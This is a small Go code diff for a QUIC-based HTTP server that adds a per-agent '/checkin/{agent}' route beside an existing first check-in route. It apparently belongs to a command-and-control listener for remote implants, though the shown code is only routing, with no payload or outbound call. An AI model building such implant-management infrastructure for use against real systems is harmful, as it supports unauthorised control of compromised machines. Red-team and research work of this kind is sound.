@@ -25,13 +25,14 @@ func StartQuic(args []string) {
 
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		fmt.Fprintf(w, "Hello, %q", r.RemoteAddr)
-		fmt.Printf("[+] Connections from: %s\n", r.RemoteAddr)
 	})
 
 	mux.HandleFunc("/first_checkin", func(w http.ResponseWriter, r *http.Request) {
-		//new_agent :=
 		first_checkin(w, r)
+	})
 
+	mux.HandleFunc("/checkin/{agent}", func(w http.ResponseWriter, r *http.Request) {
+		agent_checkin(w, r)
 	})
 
 	fmt.Printf("[+] Starting QUIC server on port %d\n", port)
